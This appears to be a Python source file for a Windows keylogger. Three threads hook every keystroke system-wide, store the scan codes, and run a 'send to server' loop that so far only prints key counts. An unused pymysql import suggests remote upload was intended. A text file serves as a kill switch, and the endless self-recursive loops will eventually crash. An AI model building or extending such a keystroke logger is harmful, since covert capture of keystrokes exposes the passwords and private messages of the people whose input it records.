from threading import Thread
import sys
from win32api import LoadKeyboardLayout
import keyboard

import pymysql
from time import time, sleep


class App:
    def __init__(self):
        self.kill_send_info = False
        self.kill_keyboard = False

        self.th1 = Thread(target=self.check_params)
        self.th2 = Thread(target=self.start_keylogger)
        self.th3 = Thread(target=self.send_data)

        self.data = []

        self.x1 = time()

    def get_keyboard_pressed(self, e):
        if e.event_type == 'up':
            print(f'\n{e.scan_code}')

            self.data.append(e.scan_code)
            print(f'You pressed: \n     name:{e.name}\n     id:{e.scan_code}\n     is_keypad:{e.is_keypad}\n     device:{e.device}')
            print(f'\n\nYou list is: {self.data}')

    def start_keylogger(self):
        LoadKeyboardLayout('00000409', 1)
        if not self.kill_keyboard:

            keyboard.hook(self.get_keyboard_pressed)
            # keyboard.wait()
        else:
            print('EXITING')
            sys.exit()

    def dublicated_keys(self):
        dic_to_replace = {'#': '3', '%': '5'}
        return [dic_to_replace.get(n, n) for n in self.data]

    def clear_history(self):
        self.data.clear()

    def total_key_pressed(self, list):
        res = dict((i, list.count(i)) for i in list)
        return res

    def send_data(self):
        if self.kill_send_info == False:
            print(f'Saving data to server!')
            clear_data = self.dublicated_keys()
            self.clear_history()
            print(self.total_key_pressed(clear_data))



            sleep(10)
            self.send_data()
        else:
            print('Sending data was STOPPED!')
            self.x2 = time()
            print(f'The program finished in: {self.x2 - self.x1}sec.')
            sys.exit()

    def check_params(self):
        try:
            with open('test.txt', 'r') as file:
                if file.read().lower() == 'stop':
                    self.kill_keyboard = True
                    self.kill_send_info = True
                    sys.exit()
                else:

                    # print(f'Flags are working [{date.hour}:{date.minute}:{date.second}]')
                    sleep(5)
                    self.check_params()
        except Exception as err:
            print(f'Error: \n{err}. \nWe will create file now.')
            with open('test.txt', 'w') as file:
                file.write('Working')
            self.check_params()

    def run(self):
        self.th1.start()  # start first Thread - check_params
        self.th2.start()  # start second Thread - start_keylogger
        self.th3.start()  # start third Thread - send_data


if __name__ == '__main__':
    App().run()